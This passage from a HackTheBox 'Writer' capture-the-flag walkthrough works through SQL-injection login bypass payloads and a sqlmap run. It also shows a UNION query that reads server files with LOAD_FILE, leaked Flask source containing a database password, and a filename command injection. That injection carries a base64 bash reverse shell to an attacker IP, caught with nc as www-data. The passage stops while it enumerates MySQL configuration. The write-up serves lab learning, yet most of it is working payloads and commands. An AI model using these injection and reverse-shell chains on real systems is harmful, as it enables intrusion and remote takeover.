[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||'2'='2'||'

[2K    * PASS: '||'2'='2'||'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||(2)LiKE(2)||'

[2K    * PASS: '||(2)LiKE(2)||'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: '||(2)LiKE(2)#

[2K    * UNAME: '||(2)LiKE(2)#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||2=2||'

[2K    * PASS: '||2=2||'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: '||'2'LiKE'2'||'

[2K    * UNAME: '||'2'LiKE'2'||'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||'2'LiKE'2'-- 2

[2K    * PASS: '||'2'LiKE'2'-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||'2'LiKE'2'#

[2K    * PASS: '||'2'LiKE'2'#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||true||'

[2K    * PASS: '||true||'

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * PASS: '||(2)LiKE(2)-- 2

[2K    * UNAME: '||(2)LiKE(2)-- 2

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||true#

[2K    * PASS: '||true#

[32m
[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m

[2K    * UNAME: '||true-- 2

[2K    * PASS: '||true-- 2
```

Looks like we have few payload working try any payload and you will be logged in as admin.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2050.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2051.jpg)

so let's enumerate this more while running sqlmap in background.

#### Sqlmap

So I intercepted the post request using the burpsuite and save it to a local file.

``` bash
kali@kali:~/HackTheBox/Writer$ cat r.txt 
POST /administrative HTTP/1.1
Host: writer.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://writer.htb
Connection: close
Referer: http://writer.htb/administrative
Upgrade-Insecure-Requests: 1

uname=admin&password=admin
```

After that I Ran sqlmap on that login form.

``` bash
kali@kali:~/HackTheBox/Writer$ sqlmap -r r.txt --dbs --batch --level 5 --risk 3
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.10#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:25:59 /2021-08-01/

[02:25:59] [INFO] parsing HTTP request from 'r.txt'
[02:26:01] [INFO] testing connection to the target URL
[02:26:02] [INFO] testing if the target URL content is stable
[02:26:02] [INFO] target URL content is stable
[02:26:02] [INFO] testing if POST parameter 'uname' is dynamic
[02:26:02] [WARNING] POST parameter 'uname' does not appear to be dynamic
[02:26:03] [WARNING] heuristic (basic) test shows that POST parameter 'uname' might not be injectable
[02:26:03] [INFO] testing for SQL injection on POST parameter 'uname'
[02:26:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[02:26:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
got a refresh intent (redirect like response common to login pages) to '/dashboard'. Do you want to apply it from now on? [Y/n] Y
got a 302 redirect to 'http://writer.htb/'. Do you want to follow? [Y/n] Y
[02:26:26] [INFO] POST parameter 'uname' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --code=302)
[02:26:28] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[02:26:28] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[02:26:28] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[02:26:30] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[02:26:30] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[02:26:31] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[02:26:31] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[02:26:31] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[02:26:32] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[02:26:32] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[02:26:33] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[02:26:34] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[02:26:34] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[02:26:35] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[02:26:35] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[02:26:36] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[02:26:37] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[02:26:40] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[02:26:40] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[02:26:41] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[02:26:41] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[02:26:41] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[02:26:41] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[02:26:41] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[02:26:41] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[02:26:41] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[02:26:41] [INFO] testing 'Generic inline queries'
[02:26:41] [INFO] testing 'MySQL inline queries'
[02:26:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[02:26:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[02:26:44] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[02:26:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[02:26:49] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[02:26:59] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[02:27:01] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[02:27:13] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[02:27:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[02:27:59] [INFO] POST parameter 'uname' appears to be 'MySQL >= 5.0.12 AND time-based blind (SLEEP)' injectable 
[02:27:59] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[02:27:59] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[02:28:18] [INFO] target URL appears to be UNION injectable with 6 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[02:29:44] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[02:29:44] [INFO] testing 'Generic UNION query (15) - 21 to 40 columns'
[02:29:54] [INFO] testing 'Generic UNION query (15) - 41 to 60 columns'
[02:30:03] [INFO] testing 'Generic UNION query (15) - 61 to 80 columns'
[02:30:10] [INFO] testing 'Generic UNION query (15) - 81 to 100 columns'
[02:30:18] [INFO] testing 'MySQL UNION query (15) - 1 to 20 columns'
[02:31:01] [INFO] testing 'MySQL UNION query (15) - 21 to 40 columns'
[02:31:14] [INFO] testing 'MySQL UNION query (15) - 41 to 60 columns'
[02:31:26] [INFO] testing 'MySQL UNION query (15) - 61 to 80 columns'
[02:31:32] [INFO] testing 'MySQL UNION query (15) - 81 to 100 columns'
[02:31:41] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
[02:31:41] [INFO] checking if the injection point on POST parameter 'uname' is a false positive
POST parameter 'uname' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 399 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: uname=-5059' OR 5521=5521-- GmkC&password=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
    Payload: uname=admin' AND SLEEP(5)-- RZDj&password=admin
---
[02:32:13] [INFO] the back-end DBMS is MySQL
[02:32:14] [WARNING] reflective value(s) found and filtering out
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
back-end DBMS: MySQL >= 5.0.12 (TiDB fork)
[02:32:15] [INFO] fetching database names
[02:32:15] [INFO] fetching number of databases
[02:32:15] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval

[02:32:15] [INFO] retrieved: 

[02:32:19] [INFO] retrieved: [02:32:19] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[02:32:21] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[02:32:21] [ERROR] unable to retrieve the number of databases
[02:32:21] [INFO] falling back to current database
[02:32:21] [INFO] fetching current database

[02:32:21] [INFO] retrieved: 

[02:34:18] [INFO] retrieved: 
[02:34:20] [CRITICAL] unable to retrieve the database names
[02:34:20] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/writer.htb'
[02:34:20] [WARNING] your sqlmap version is outdated

[*] ending @ 02:34:20 /2021-08-01/
```

Looks like we have SQL Injection but we cannot retrive database names which is annoying so let's try and read some files.
So we know that the it's time based blind sql injection so it will take up lot of time to get long file so I decided to check which payload sqlmap uses for the injection and play around with that payload manually to read some files.

I used wireshark to get the exact payload that sqlmap used I used wireshark to capture traffic on my tun0 interface which looked like.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2052.jpg)

Then I picked up a POST request to /administrative endpoint that has a payload and followed it's TCP stream.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2053.jpg)

and we have the payload.

``` bash
UNAME%27%20AND%20%28SELECT%201088%20FROM%20%28SELECT%28SLEEP%281-%28IF%28ORD%28MID%28%28IFNULL%28CAST%28HEX%28LOAD_FILE%280x2f6574632f686f73746e616d65%29%29%20AS%20NCHAR%29%2C0x20%29%29%2C6%2C1%29%29%3E57%2C0%2C1%29%29%29%29%29ZDPK%29%20AND%20%27GIYW%27%3D%27GIYW
```

URL Decoding the payload will make it more redable.

``` bash
UNAME' AND (SELECT 1088 FROM (SELECT(SLEEP(1-(IF(ORD(MID((IFNULL(CAST(HEX(LOAD_FILE(0x2f6574632f686f73746e616d65)) AS NCHAR),0x20)),6,1))>57,0,1)))))ZDPK) AND 'GIYW'='GIYW
```

and there is still few hex numbers in the there so let's get them sorted also.

``` bash
kali@kali:~/HackTheBox/Writer$ python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print(bytes.fromhex('2f6574632f686f73746e616d65'))
b'/etc/hostname'
>>> print(bytes.fromhex('20'))
b' '
```

So the final payload looks like as follow.

``` bash
UNAME' AND (SELECT 1088 FROM (SELECT(SLEEP(1-(IF(ORD(MID((IFNULL(CAST(HEX(LOAD_FILE(/etc/hostname)) AS NCHAR), )),6,1))>57,0,1)))))ZDPK) AND 'GIYW'='GIYW
```

so it is still the time based sql injection which can take a lot of time so, we have to think of some other techinique to get the files. One famous and extremly fast technique is using union statement so let's create the cascade of the main sql query.

#### Exploitation
#### Creating fast Working SQL query

So we know we will use union so we will use something like UNION ALL SELECT and then we know we have to use function readfile to readfiles from remote filesystem.

so that being said let's create a query.

#### step 1 -> terminiating the ongoin query

We have to use single quotes to terminate the query.
oops '

#### step 2  -> Using UNION statement:

UNION ALL SELECT

#### step 3 -> Adjusting No. of rows.

This is probably the trickiest step of all the steps.
As we know that the table will have at leat two columns uname and password it's best to start with that. so let's try that.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2054.jpg)

So looks like our no. of columns is mismatched as we get incorrect credential when we get the no. of colums equal to the no. of colums in table we should be logged in.

Trying for all number of columns we get hit on 6 columns.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2055.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2056.jpg)

so now we know the number of columns.

#### step 4 -> Which column to inject so it returns the output.

So the answer to this lies in the above photo upon succesfully injecting the query we get the output 'welcome 1' so we know the content of column 2 is displayed so we have to inject that column.

0,{SOME SQL CODE},2,3,4,5

#### step 5 -> Terminate the query

after you SQL query just terminate the query so it doesn't spit out the error.

#### Final SQL query

Combining all the above steps to generate the sql query we get something like this.

``` sql
oops' UNION ALL SELECT 0,LOAD_FILE('/etc/passwd'),2,3,4,5; --
```

So let's try that query.
And Boom we have fast SQL query to read files.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2057.jpg)

So Now we can try few things we can try and search for passwords for most part we don't have much on this. [THERE IS THE UNINTENDED WAY BUT WE WILL KEEP DISTANCE FROM IT AS IT'S BASICALLY BRUTEFORCING]

So another thing we could do is just look for the source code of the website and try to find vuln in that.

So let's see the apache conf file to find the root directory of the installation of apache server.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2058.jpg)

Looks like the root directory is /var/www/writer.htb/writer/ and we have the path to .wsgi file so let's look at that first. /var/www/writer.htb/writer.wsgi

#### writer.wsgi

``` python
Welcome #!/usr/bin/python
import sys
import logging
import random
import os

# Define logging
logging.basicConfig(stream=sys.stderr)
sys.path.insert(0,&#34;/var/www/writer.htb/&#34;)

# Import the __init__.py from the app folder
from writer import app as application
application.secret_key = os.environ.get(&#34;SECRET_KEY&#34;, &#34;&#34;)
```

so we know that it has __init__.py in app folder so let's hunt for that.
You find that file on /var/www/writer.htb/writer/__init__.py

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2059.jpg)

#### __init__.py

``` python
#!/usr/bin/env python3

from flask import Flask, session, redirect, url_for, request, render_template
from mysql.connector import errorcode
import mysql.connector
import urllib.request
import os
import PIL
from PIL import Image, UnidentifiedImageError
import hashlib

app = Flask(__name__,static_url_path='',static_folder='static',template_folder='templates')

#Define connection for database
def connections():
    try:
	connector = mysql.connector.connect(user='admin', password='ToughPasswordToCrack', host='127.0.0.1', database='writer')
	return connector
    except mysql.connector.Error as err:
	if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:
	    return ("Something is wrong with your db user name or password!")
	elif err.errno == errorcode.ER_BAD_DB_ERROR:
	    return ("Database does not exist")
	else:
	    return ("Another exception, returning!")
    else:
	print ('Connection to DB is ready!')

#Define homepage
@app.route('/')
def home_page():
    try:
	connector = connections()
    except mysql.connector.Error as err:
	    return ("Database error")
    cursor = connector.cursor()
    sql_command = "SELECT * FROM stories;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('blog/blog.html', results=results)

#Define about page
@app.route('/about')
def about():
    return render_template('blog/about.html')

#Define contact page
@app.route('/contact')
def contact():
    return render_template('blog/contact.html')

#Define blog posts
@app.route('/blog/post/<id>', methods=['GET'])
def blog_post(id):
    try:
	connector = connections()
    except mysql.connector.Error as err:
	    return ("Database error")
    cursor = connector.cursor()
    cursor.execute("SELECT * FROM stories WHERE id = %(id)s;", {'id': id})
    results = cursor.fetchall()
    sql_command = "SELECT * FROM stories;"
    cursor.execute(sql_command)
    stories = cursor.fetchall()
    return render_template('blog/blog-single.html', results=results, stories=stories)

#Define dashboard for authenticated users
@app.route('/dashboard')
def dashboard():
    if not ('user' in session):
	return redirect('/')
    return render_template('dashboard.html')

#Define stories page for dashboard and edit/delete pages
@app.route('/dashboard/stories')
def stories():
    if not ('user' in session):
	return redirect('/')
    try:
	connector = connections()
    except mysql.connector.Error as err:
	    return ("Database error")
    cursor = connector.cursor()
    sql_command = "Select * From stories;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('stories.html', results=results)

@app.route('/dashboard/stories/add', methods=['GET', 'POST'])
def add_story():
    if not ('user' in session):
	return redirect('/')
    try:
	connector = connections()
    except mysql.connector.Error as err:
	    return ("Database error")
    if request.method == "POST":
	if request.files['image']:
	    image = request.files['image']
	    if ".jpg" in image.filename:
		path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
		image.save(path)
		image = "/img/{}".format(image.filename)
	    else:
		error = "File extensions must be in .jpg!"
		return render_template('add.html', error=error)

	if request.form.get('image_url'):
	    image_url = request.form.get('image_url')
	    if ".jpg" in image_url:
		try:
		    local_filename, headers = urllib.request.urlretrieve(image_url)
		    os.system("mv {} {}.jpg".format(local_filename, local_filename))
		    image = "{}.jpg".format(local_filename)
		    try:
			im = Image.open(image) 
			im.verify()
			im.close()
			image = image.replace('/tmp/','')
			os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
			image = "/img/{}".format(image)
		    except PIL.UnidentifiedImageError:
			os.system("rm {}".format(image))
			error = "Not a valid image file!"
			return render_template('add.html', error=error)
		except:
		    error = "Issue uploading picture"
		    return render_template('add.html', error=error)
	    else:
		error = "File extensions must be in .jpg!"
		return render_template('add.html', error=error)
	author = request.form.get('author')
	title = request.form.get('title')
	tagline = request.form.get('tagline')
	content = request.form.get('content')
	cursor = connector.cursor()
	cursor.execute("INSERT INTO stories VALUES (NULL,%(author)s,%(title)s,%(tagline)s,%(content)s,'Published',now(),%(image)s);", {'author':author,'title': title,'tagline': tagline,'content': content, 'image':image })
	result = connector.commit()
	return redirect('/dashboard/stories')
    else:
	return render_template('add.html')

@app.route('/dashboard/stories/edit/<id>', methods=['GET', 'POST'])
def edit_story(id):
    if not ('user' in session):
	return redirect('/')
    try:
	connector = connections()
    except mysql.connector.Error as err:
	    return ("Database error")
    if request.method == "POST":
	cursor = connector.cursor()
	cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
	results = cursor.fetchall()
	if request.files['image']:
	    image = request.files['image']
	    if ".jpg" in image.filename:
		path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
		image.save(path)
		image = "/img/{}".format(image.filename)
		cursor = connector.cursor()
		cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
		result = connector.commit()
	    else:
		error = "File extensions must be in .jpg!"
		return render_template('edit.html', error=error, results=results, id=id)
	if request.form.get('image_url'):
	    image_url = request.form.get('image_url')
	    if ".jpg" in image_url:
		try:
		    local_filename, headers = urllib.request.urlretrieve(image_url)
		    os.system("mv {} {}.jpg".format(local_filename, local_filename))
		    image = "{}.jpg".format(local_filename)
		    try:
			im = Image.open(image) 
			im.verify()
			im.close()
			image = image.replace('/tmp/','')
			os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
			image = "/img/{}".format(image)
			cursor = connector.cursor()
			cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
			result = connector.commit()

		    except PIL.UnidentifiedImageError:
			os.system("rm {}".format(image))
			error = "Not a valid image file!"
			return render_template('edit.html', error=error, results=results, id=id)
		except:
		    error = "Issue uploading picture"
		    return render_template('edit.html', error=error, results=results, id=id)
	    else:
		error = "File extensions must be in .jpg!"
		return render_template('edit.html', error=error, results=results, id=id)
	title = request.form.get('title')
	tagline = request.form.get('tagline')
	content = request.form.get('content')
	cursor = connector.cursor()
	cursor.execute("UPDATE stories SET title = %(title)s, tagline = %(tagline)s, content = %(content)s WHERE id = %(id)s", {'title':title, 'tagline':tagline, 'content':content, 'id': id})
	result = connector.commit()
	return redirect('/dashboard/stories')

    else:
	cursor = connector.cursor()
	cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
	results = cursor.fetchall()
	return render_template('edit.html', results=results, id=id)

@app.route('/dashboard/stories/delete/<id>', methods=['GET', 'POST'])
def delete_story(id):
    if not ('user' in session):
	return redirect('/')
    try:
	connector = connections()
    except mysql.connector.Error as err:
	    return ("Database error")
    if request.method == "POST":
	cursor = connector.cursor()
	cursor.execute("DELETE FROM stories WHERE id = %(id)s;", {'id': id})
	result = connector.commit()
	return redirect('/dashboard/stories')
    else:
	cursor = connector.cursor()
	cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
	results = cursor.fetchall()
	return render_template('delete.html', results=results, id=id)

#Define user page for dashboard
@app.route('/dashboard/users')
def users():
    if not ('user' in session):
	return redirect('/')
    try:
	connector = connections()
    except mysql.connector.Error as err:
	return "Database Error"
    cursor = connector.cursor()
    sql_command = "SELECT * FROM users;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('users.html', results=results)

#Define settings page
@app.route('/dashboard/settings', methods=['GET'])
def settings():
    if not ('user' in session):
	return redirect('/')
    try:
	connector = connections()
    except mysql.connector.Error as err:
	return "Database Error!"
    cursor = connector.cursor()
    sql_command = "SELECT * FROM site WHERE id = 1"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('settings.html', results=results)

#Define authentication mechanism
@app.route('/administrative', methods=['POST', 'GET'])
def login_page():
    if ('user' in session):
	return redirect('/dashboard')
    if request.method == "POST":
	username = request.form.get('uname')
	password = request.form.get('password')
	password = hashlib.md5(password.encode('utf-8')).hexdigest()
	try:
	    connector = connections()
	except mysql.connector.Error as err:
	    return ("Database error")
	try:
	    cursor = connector.cursor()
	    sql_command = "Select * From users Where username = '%s' And password = '%s'" % (username, password)
	    cursor.execute(sql_command)
	    results = cursor.fetchall()
	    for result in results:
		print("Got result")
	    if result and len(result) != 0:
		session['user'] = username
		return render_template('success.html', results=results)
	    else:
		error = "Incorrect credentials supplied"
		return render_template('login.html', error=error)
	except:
	    error = "Incorrect credentials supplied"
	    return render_template('login.html', error=error)
    else:
	return render_template('login.html')

@app.route("/logout")
def logout():
    if not ('user' in session):
	return redirect('/')
    session.pop('user')
    return redirect('/')

if __name__ == '__main__':
   app.run("0.0.0.0")
```

WOAH it's a long file so let's just glaze through it and see if we can find something intresting.

Just looking at the imported library we can see that it is importing OS so that's intresting so just look for the instance of OS only to see if we have code execution somewhere.

Looking for os.system which basically executes the bash commands we find this piece of code.

``` python
if request.form.get('image_url'):
	    image_url = request.form.get('image_url')
	    if ".jpg" in image_url:
		try:
		    local_filename, headers = urllib.request.urlretrieve(image_url)
		    os.system("mv {} {}.jpg".format(local_filename, local_filename))
		    image = "{}.jpg".format(local_filename)
		    try:
			im = Image.open(image)
			im.verify()
			im.close()
			image = image.replace('/tmp/','')
			os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
			image = "/img/{}".format(image)
		    except PIL.UnidentifiedImageError:
			os.system("rm {}".format(image))
			error = "Not a valid image file!"
			return render_template('add.html', error=error)
```

So looks like we have command injection in the name of the image as it is sending the filename directly to system command without sanatizing it but we have to be careful about the speacial chars so it doesn't break the command in between so I will base64 encode it to be safe.

#### Generating file with malicious name

``` bash
┌──(root💀kali)-[~/hackthebox/machine/writer]
└─# echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.31/2233 0>&1'" | base64                                                        
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMS8yMjMzIDA+JjEn
┌──(root💀kali)-[~/hackthebox/machine/writer]
└─# touch '1.jpg; `echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMS8yMjMzIDA+JjEn | base64 -d | bash `;'
┌──(root💀kali)-[~/hackthebox/machine/writer]
└─# ls
'1.jpg; `echo YmFzaCAtYyAnYmFz<---SNIP--->= | base64 -d | bash `;'   ffuf.log      me.jpg      nmap.nmap   sqlmap.log
 enum4linux.log                                                                                             intial.nmap   nikto.log   r.txt       user.txt
┌──(root💀kali)-[~/hackthebox/machine/writer]
└─#
```

Now that we have that file we have to upload it but before doing that start your nc listener.
So now pick any of exsisting story and edit it and change the image file with your image file.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2060.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2061.jpg)

After you did that then you have to trigger that mv {} {} command by going to edit and changing the image url.
Now intercept the the edit of the same story with the burp.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2062.jpg)

Now change the higlighted feild with the name of the malicious file.

But you have to give the local location of the filename so you know the base directory of the installation and from ffuf directorty fuzzing above we know that images are saved in /static.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2063.jpg)

and boom you can see our file so let's write a local path for this file.

``` bash
file:///var/www/writer.htb/writer/static/img/1.jpg; `echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMS8yMjMzIDA+JjEn | base64 -d | bash `;#
```

so let's change this as image url and add '#' sign at end so it ignores everything after our commands get executed.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2064.jpg)

And boom we have the REVSHELL.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/writer]
└─# nc -lvp 2233
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::2233
Ncat: Listening on 0.0.0.0:2233
Ncat: Connection from 10.10.11.101.
Ncat: Connection from 10.10.11.101:42662.
bash: cannot set terminal process group (1061): Inappropriate ioctl for device
bash: no job control in this shell
www-data@writer:/$ id

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@writer:/$ 
www-data@writer:/$ whoami
whoami
www-data
```

#### Getting user
#### Enumeration

Looking for services just on localhost

#### ss -tupln

``` bash
ss -tupln
Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   Process                                                                         
udp     UNCONN   0        0          127.0.0.53%lo:53            0.0.0.0:*                                                                                      
udp     UNCONN   0        0           10.10.11.255:137           0.0.0.0:*                                                                                      
udp     UNCONN   0        0           10.10.11.101:137           0.0.0.0:*                                                                                      
udp     UNCONN   0        0                0.0.0.0:137           0.0.0.0:*                                                                                      
udp     UNCONN   0        0           10.10.11.255:138           0.0.0.0:*                                                                                      
udp     UNCONN   0        0           10.10.11.101:138           0.0.0.0:*                                                                                      
udp     UNCONN   0        0                0.0.0.0:138           0.0.0.0:*                                                                                      
tcp     LISTEN   0        80             127.0.0.1:3306          0.0.0.0:*                                                                                      
tcp     LISTEN   0        50               0.0.0.0:139           0.0.0.0:*                                                                                      
tcp     LISTEN   0        10             127.0.0.1:8080          0.0.0.0:*       users:(("python3",pid=3262,fd=4))                                              
tcp     LISTEN   0        4096       127.0.0.53%lo:53            0.0.0.0:*                                                                                      
tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*                                                                                      
tcp     LISTEN   0        100            127.0.0.1:25            0.0.0.0:*                                                                                      
tcp     LISTEN   0        50               0.0.0.0:445           0.0.0.0:*                                                                                      
tcp     LISTEN   0        50                  [::]:139              [::]:*                                                                                      
tcp     LISTEN   0        511                    *:80                  *:*                                                                                      
tcp     LISTEN   0        128                 [::]:22               [::]:*                                                                                      
tcp     LISTEN   0        50                  [::]:445              [::]:*     
```

So we have mysql db so let's try to read it's conf files.

``` bash
www-data@writer:$ cd /etc/mysql
www-data@writer:/etc/mysql$ ls
conf.d
debian-start
debian.cnf
mariadb.cnf
mariadb.conf.d
my.cnf
my.cnf.fallback
www-data@writer:/etc/mysql$ cat mariadb.cnf
# The MariaDB configuration file
#
# The MariaDB/MySQL tools read configuration files in the following order:
# 1. "/etc/mysql/mariadb.cnf" (this file) to set global defaults,
# 2. "/etc/mysql/conf.d/*.cnf" to set global options.
# 3. "/etc/mysql/mariadb.conf.d/*.cnf" to set MariaDB-only options.
# 4. "~/.my.cnf" to set user-specific options.
#
# If the same option is defined multiple times, the last one will apply.
#
# One can use all long options that the program supports.
# Run program with --help to get a list of available options and with
# --print-defaults to see which it would actually understand and use.

#
# This group is read both both by the client and the server
